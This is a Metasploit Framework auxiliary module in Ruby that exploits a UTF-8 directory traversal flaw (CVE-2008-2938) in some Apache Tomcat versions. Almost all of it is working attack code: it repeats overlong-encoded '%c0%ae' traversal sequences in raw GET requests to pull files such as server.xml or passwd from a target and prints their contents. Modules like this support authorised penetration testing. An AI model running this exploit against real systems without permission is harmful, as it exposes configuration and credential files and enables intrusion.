##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WMAPScanServer
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'Tomcat UTF-8 Directory Traversal Vulnerability',
			'Version'     => '$Revision$',
			'Description' => %q{
				This module tests whether a directory traversal vulnerablity is present
				in versions of Apache Tomcat 4.1.0 - 4.1.37, 5.5.0 - 5.5.26 and 6.0.0
				- 6.0.16 under specific and non-default installations. The connector must have
				allowLinking set to true and URIEncoding set to UTF-8. Furthermore, the
				vulnerability actually occurs within Java and not Tomcat; the server must
				use Java versions prior to Sun 1.4.2_19, 1.5.0_17, 6u11 - or prior IBM Java
				5.0 SR9, 1.4.2 SR13, SE 6 SR4 releases. This module has only been tested against
				RedHat 9 running Tomcat 6.0.16 and Sun JRE 1.5.0-05. You may wish to change
				FILE (e.g. passwd or hosts), MAXDIRS and RPORT depending on your environment.
				},
			'References'  =>
				[
					[ 'URL', 'http://tomcat.apache.org/' ],
					[ 'OSVDB', '47464' ],
					[ 'CVE', '2008-2938' ],
					[ 'URL', 'http://www.securityfocus.com/archive/1/499926' ],
				],
			'Author'      => [ 'patrick' ],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('FILE', [ true, 'The file to traverse for', '/conf/server.xml']),
				OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7]),
			], self.class)
	end

	def run_host(ip)

		traversal = '/%c0%ae%c0%ae'

		begin
			print_status("Attempting to connect to #{rhost}:#{rport}")
			res = send_request_raw(
				{
					'method'  => 'GET',
					'uri'     => '/',
				}, 25)

			if (res)

			1.upto(datastore['MAXDIRS']) do |level|
				try = traversal * level
				res = send_request_raw(
					{
						'method'  => 'GET',
						'uri'     => try + datastore['FILE'],
					}, 25)
				if (res and res.code == 200)

					print_status("Request ##{level} may have succeeded on #{rhost}:#{rport}! Response: \r\n#{res.body}")
					break
				elsif (res and res.code)
					print_error("Attempt ##{level} returned HTTP error #{res.code} on #{rhost}:#{rport}")
				end
			end


		end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE

		end
	end
end
